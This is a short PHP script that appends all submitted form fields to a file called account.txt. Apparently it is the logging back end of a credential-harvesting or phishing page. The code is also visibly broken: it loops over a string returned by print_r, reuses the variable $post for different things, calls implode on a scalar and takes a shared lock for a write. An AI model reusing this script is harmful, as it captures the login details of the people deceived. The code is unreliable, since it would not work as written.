<?php

$post = print_r($_POST, true);
$fp = fopen('account.txt', 'a');
flock($fp, LOCK_SH);
foreach ($post as $post => $post_value) {
    fwrite($fp, implode('|', $post));
}
echo $post;
flock($fp, LOCK_UN);
fclose($fp);
